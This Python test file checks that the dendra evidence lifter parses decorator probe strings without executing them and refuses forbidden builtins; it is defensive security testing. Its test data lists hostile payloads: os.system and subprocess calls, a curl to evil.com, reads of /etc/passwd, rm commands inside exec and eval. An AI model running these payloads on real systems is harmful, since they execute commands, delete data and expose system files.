# Copyright (c) 2026 B-Tree Ventures, LLC
# SPDX-License-Identifier: Apache-2.0

"""Annotation-API abuse tests - the highest-value attack surface.

The ``@evidence_via_probe(field="probe_expr")`` decorator takes a
STRING that the lifter splices into generated code. If the lifter
``eval``s or ``exec``s the string at lift time, it's a code-injection
vulnerability when the user runs ``dendra init --auto-lift`` against
attacker-controlled annotation source.

Defensive contract enforced here:

  - ``_extract_probe_overrides`` parses the probe string with
    ``ast.parse(..., mode='eval')`` and never evaluates it.
  - The lifter does not ``compile`` or ``exec`` the parsed expression
    during the lift pass.
  - Statements (non-expressions) are rejected outright.
  - Hostile expressions (``__import__``, ``eval``, ``exec``, ``open``)
    that would be dangerous AT EXECUTION TIME are either rejected
    cleanly OR included as-is in the generated source for the user
    to inspect - never silently executed.

For ``@evidence_inputs(field=lambda: ...)``: the lambda is a callable
the user supplied. The lifter must NOT invoke it during lift; only
the generated `_gather` calls it at dispatch time, when the user
controls when execution happens.
"""

from __future__ import annotations

import os

import pytest

pytestmark = pytest.mark.redteam


# ---------------------------------------------------------------------
# Lifter does not eval/exec the probe string at lift time
# ---------------------------------------------------------------------


_HOSTILE_PROBES = [
    # Direct __import__ chain
    "__import__('os').system('echo PWNED-via-probe > /tmp/dendra-probe-rce')",
    # File read
    "open('/etc/passwd').read()",
    # Conditional with side effect - would fire at lift time if eval'd
    "api.x() if not __import__('os').system('rm') else None",
    # Subprocess via builtin
    "__import__('subprocess').check_output(['curl', 'evil.com'])",
    # exec()
    "exec('import os; os.system(\"rm\")')",
    # eval()
    'eval(\'__import__("os").system("rm")\')',
]


@pytest.mark.parametrize("probe", _HOSTILE_PROBES)
def test_probe_string_not_executed_during_lift(probe, tmp_path):
    """Hostile probe expressions must not execute when the lifter
    extracts them. The defensive contract: lift-time is a STATIC
    analysis pass; no probe / lambda / annotation runs.
    """
    sentinel = "/tmp/dendra-probe-rce"
    if os.path.exists(sentinel):
        os.unlink(sentinel)

    from dendra.lifters.branch import LiftRefused
    from dendra.lifters.evidence import lift_evidence

    source = (
        f"@evidence_via_probe(charge_ok={probe!r})\n"
        "def classify(req):\n"
        "    user = api.charge(req)\n"
        "    if user.ok:\n"
        "        return 'ok'\n"
        "    return 'reject'\n"
    )
    # The lift call may raise LiftRefused (analyzer/lifter rejection)
    # or return a string - but it MUST NOT execute the probe.
    try:
        lift_evidence(source, "classify")
    except (LiftRefused, SyntaxError, ValueError):
        pass

    assert not os.path.exists(sentinel), (
        f"Probe expression {probe!r} executed during lift - that's "
        "remote code execution against any user who runs "
        "`dendra init --auto-lift` on attacker-source."
    )


def test_probe_string_parsed_in_eval_mode_only():
    """``ast.parse(probe, mode='eval')`` parses ONE expression only.

    A statement-shaped probe (assignment, def, import) raises
    SyntaxError, which the lifter swallows (line 269-270 of
    evidence.py). The probe is silently dropped - better than
    accepting a multi-statement injection.
    """
    import ast

    # Statements are syntax errors in mode='eval'.
    with pytest.raises(SyntaxError):
        ast.parse("def x(): pass; api.y()", mode="eval")
    with pytest.raises(SyntaxError):
        ast.parse("import os; os.system('rm')", mode="eval")
    with pytest.raises(SyntaxError):
        ast.parse("x = 1", mode="eval")


def test_probe_with_statements_silently_ignored():
    """A probe string that is NOT a single expression (a statement,
    a multi-stmt sequence) is silently dropped by the lifter.

    The defensive contract: the SyntaxError from
    ``ast.parse(..., mode='eval')`` is swallowed (evidence.py:269-270),
    so the override is not applied. The output of the lift may or
    may not contain code referencing the dropped probe - what we
    forbid is silent execution of the statement.
    """
    sentinel = "/tmp/dendra-probe-stmt-fired"
    if os.path.exists(sentinel):
        os.unlink(sentinel)

    from dendra.lifters.branch import LiftRefused
    from dendra.lifters.evidence import lift_evidence

    source = (
        f"@evidence_via_probe(charge_ok=\"import os; os.system('touch {sentinel}')\")\n"
        "def classify(req):\n"
        "    user = api.charge(req)\n"
        "    if user.ok:\n"
        "        return 'ok'\n"
        "    return 'reject'\n"
    )
    # Either lift refuses or accepts; either way nothing executed.
    try:
        lift_evidence(source, "classify")
    except (LiftRefused, ValueError, SyntaxError):
        pass

    assert not os.path.exists(sentinel)


# ---------------------------------------------------------------------
# Hostile probes that DO parse - what does the lifter do with them?
# ---------------------------------------------------------------------


def test_hostile_probe_rejected_outright():
    """A probe expression that calls ``__import__`` / ``eval`` /
    ``exec`` / ``compile`` / ``open`` / ``getattr`` is REFUSED by the
    lifter at extraction time.

    BUG FIX: previously the lifter parsed the probe via
    ``ast.parse(mode='eval')`` - which prevented lift-time RCE - but
    spliced the parsed expression verbatim into the generated source.
    A user who then imported the generated module would fire the
    dangerous builtin call. Now ``_extract_probe_overrides`` walks
    the parsed expression for any ``Call(func=Name(id in
    _FORBIDDEN_PROBE_BUILTINS))`` and raises ``LiftRefused`` with a
    clear "unsafe_probe" reason. The probe never reaches generated
    source.
    """
    sentinel = "/tmp/dendra-probe-quarantine"
    if os.path.exists(sentinel):
        os.unlink(sentinel)

    from dendra.lifters.branch import LiftRefused
    from dendra.lifters.evidence import lift_evidence

    source = (
        "@evidence_via_probe(charge_ok=\"__import__('os').system('echo X > /tmp/dendra-probe-quarantine')\")\n"
        "def classify(req):\n"
        "    user = api.charge(req)\n"
        "    if user.ok:\n"
        "        return 'ok'\n"
        "    return 'reject'\n"
    )
    with pytest.raises(LiftRefused, match="unsafe_probe"):
        lift_evidence(source, "classify")

    # And nothing executed at lift time.
    assert not os.path.exists(sentinel)


@pytest.mark.parametrize(
    "probe",
    [
        "__import__('os').system('rm')",
        "eval('1+1')",
        "exec('x=1')",
        "compile('x', 'f', 'eval')",
        "open('/etc/passwd').read()",
        "getattr(api, 'sensitive')()",
        # Nested deeper - must still be detected by the AST walk.
        "api.x() if True else __import__('os').system('rm')",
        "(lambda: __import__('os'))()",
    ],
)
def test_forbidden_builtin_in_probe_rejected(probe):
    """Each forbidden builtin variant - at any AST depth - must be rejected."""
    from dendra.lifters.branch import LiftRefused
    from dendra.lifters.evidence import lift_evidence

    source = (
        f"@evidence_via_probe(field={probe!r})\n"
        "def classify(req):\n"
        "    user = api.charge(req)\n"
        "    if user.ok:\n"
        "        return 'ok'\n"
        "    return 'reject'\n"
    )
    with pytest.raises(LiftRefused, match="unsafe_probe"):
        lift_evidence(source, "classify")


def test_safe_probe_still_accepted():
    """A normal probe call (no forbidden builtins) must still work
    after the unsafe-probe check is in place. Regression guard.
    """
    from dendra.lifters.evidence import lift_evidence

    source = (
        '@evidence_via_probe(charge_status="api.charge_probe(req)")\n'
        "def maybe_charge(req):\n"
        "    response = api.charge(req)\n"
        "    if response.ok:\n"
        "        notify(req)\n"
        "        return 'charged'\n"
        "    return 'skipped'\n"
    )
    # Must not raise.
    out = lift_evidence(source, "maybe_charge")
    assert "api.charge_probe(req)" in out


# ---------------------------------------------------------------------
# evidence_inputs lambdas - the lifter must NOT call them at lift time
# ---------------------------------------------------------------------


def test_evidence_inputs_lambda_not_called_at_lift_time():
    """The lifter sees the lambda as an AST node. It uses
    ``kw.value.body`` (the AST of the lambda's body) - the lambda
    itself is never invoked.
    """
    sentinel = "/tmp/dendra-lambda-fired-at-lift"
    if os.path.exists(sentinel):
        os.unlink(sentinel)

    from dendra.lifters.branch import LiftRefused
    from dendra.lifters.evidence import lift_evidence

    # The lambda body looks dangerous, but the lifter only inspects the
    # AST, not the runtime behavior.
    source = (
        '@evidence_inputs(role=lambda: __import__("os").system("touch /tmp/dendra-lambda-fired-at-lift"))\n'
        "def classify(req):\n"
        "    role = getattr(req, 'role')\n"
        "    if role == 'admin':\n"
        "        return 'allow'\n"
        "    return 'deny'\n"
    )
    try:
        lift_evidence(source, "classify")
    except (LiftRefused, ValueError, SyntaxError):
        pass

    # The lambda has not been invoked - it's only an AST node to the lifter.
    assert not os.path.exists(sentinel)


# ---------------------------------------------------------------------
# Sanity: the parser is bounded
# ---------------------------------------------------------------------


def test_extract_probe_overrides_is_pure_extraction():
    """``_extract_probe_overrides`` calls ``ast.parse(..., mode='eval')``
    only. Pin that promise: the function's source must not contain
    eval / exec / compile / __import__ in non-comment positions.
    """
    import inspect

    from dendra.lifters import evidence

    src = inspect.getsource(evidence._extract_probe_overrides)
    # Strip comments + docstring to focus on real code paths.
    code_lines = []
    in_docstring = False
    for line in src.split("\n"):
        stripped = line.strip()
        if stripped.startswith('"""') or stripped.startswith("'''"):
            in_docstring = not in_docstring
            continue
        if in_docstring:
            continue
        if stripped.startswith("#"):
            continue
        code_lines.append(line)
    code = "\n".join(code_lines)
    for forbidden in ("eval(", "exec(", "compile(", "__import__("):
        assert forbidden not in code, (
            f"_extract_probe_overrides contains {forbidden} - a static "
            "extraction pass must never invoke a dynamic-execution builtin."
        )


def test_lift_evidence_does_not_compile_or_exec_in_module_imports():
    """The whole evidence-lifter module must not call eval/exec/compile
    on user input at module level or in the public lift_evidence path.

    This is a coarse guard: a precise audit is in the test_lift_evidence_*
    files. Here we pin the absence at the module-source level.
    """
    from pathlib import Path

    from dendra.lifters import evidence

    src = Path(evidence.__file__).read_text(encoding="utf-8")
    # Allow ast.parse / ast.dump / ast.unparse - those are safe.
    # Disallow the dynamic-execution trio against user input.
    # We accept that "exec" appears in the analyzer's hazard category
    # name "eval_exec" (a string literal in tests / message). So scan
    # only for the call shape "exec(", "eval(", "compile(".
    for forbidden in ("eval(", "exec(", "compile("):
        # Allow occurrences inside string literals (e.g. error
        # messages).  Easy approximation: count occurrences and check
        # they ALL appear inside double-quoted strings.
        idx = 0
        while True:
            idx = src.find(forbidden, idx)
            if idx == -1:
                break
            # Find the surrounding line.
            line_start = src.rfind("\n", 0, idx) + 1
            line_end = src.find("\n", idx)
            line = src[line_start : line_end if line_end != -1 else None]
            # Tolerate when the forbidden token sits inside a quoted
            # string on that line.
            quoted = (
                ('"' + forbidden in line)
                or ("'" + forbidden in line)
                or (forbidden in line and '"' in line[: line.index(forbidden)])
            )
            assert quoted, (
                f"evidence.py line contains a real call to {forbidden}: {line!r}. "
                "Static extraction must not invoke dynamic execution."
            )
            idx += 1
